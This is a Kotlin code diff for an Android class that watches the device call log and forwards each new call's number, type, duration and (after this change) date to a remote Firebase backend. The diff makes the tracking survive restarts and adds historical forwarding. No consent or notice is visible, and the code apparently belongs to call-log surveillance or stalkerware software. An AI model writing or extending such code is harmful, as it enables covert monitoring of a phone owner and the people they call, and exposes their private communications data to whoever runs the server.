@@ -7,10 +7,6 @@ import android.provider.CallLog
 import android.util.Log
 
 class CallLogObserver(private val context: Context, handler: Handler) : ContentObserver(handler) {
-
-    private var lastCallId = -1L
-    private var lastDuration = -1L
-
     override fun onChange(selfChange: Boolean) {
         super.onChange(selfChange)
         try {
@@ -30,16 +26,22 @@ class CallLogObserver(private val context: Context, handler: Handler) : ContentO
             cursor?.use {
                 if (it.moveToFirst()) {
                     val id = it.getLong(it.getColumnIndexOrThrow(CallLog.Calls._ID))
-                    val dur    = it.getLong(it.getColumnIndexOrThrow(CallLog.Calls.DURATION))
+                    val dur = it.getLong(it.getColumnIndexOrThrow(CallLog.Calls.DURATION))
                     
-                    if (id == lastCallId && dur == lastDuration) return  // already processed exact state
-
-                    lastCallId = id
-                    lastDuration = dur
+                    val prefs = context.getSharedPreferences("AppPrefs", Context.MODE_PRIVATE)
+                    val lastSavedId = prefs.getLong("last_call_id", -1L)
+                    val lastSavedDur = prefs.getLong("last_call_duration", -1L)
+                    
+                    if (id == lastSavedId && dur == lastSavedDur) return
+                    
+                    prefs.edit()
+                        .putLong("last_call_id", id)
+                        .putLong("last_call_duration", dur)
+                        .apply()
 
                     val number = it.getString(it.getColumnIndexOrThrow(CallLog.Calls.NUMBER)) ?: "Unknown"
                     val type   = it.getInt(it.getColumnIndexOrThrow(CallLog.Calls.TYPE))
-
+                    val date   = it.getLong(it.getColumnIndexOrThrow(CallLog.Calls.DATE))
                     val typeText = when (type) {
                         CallLog.Calls.INCOMING_TYPE  -> "📲 Incoming Call"
                         CallLog.Calls.OUTGOING_TYPE  -> "📞 Outgoing Call"
@@ -47,12 +49,11 @@ class CallLogObserver(private val context: Context, handler: Handler) : ContentO
                         CallLog.Calls.REJECTED_TYPE  -> "🚫 Rejected Call"
                         else                         -> "📳 Unknown Call"
                     }
-
                     val mins = dur / 60
                     val secs = dur % 60
                     val durationText = if (dur > 0) "${mins}m ${secs}s" else "0s"
 
-                    FirebaseForwarder.sendCallLog(context, number, typeText, durationText)
+                    FirebaseForwarder.sendHistoricalCallLog(context, number, typeText, durationText, date)
                     Log.d("CallLogObserver", "Call forwarded: $typeText from $number")
                 }
             }
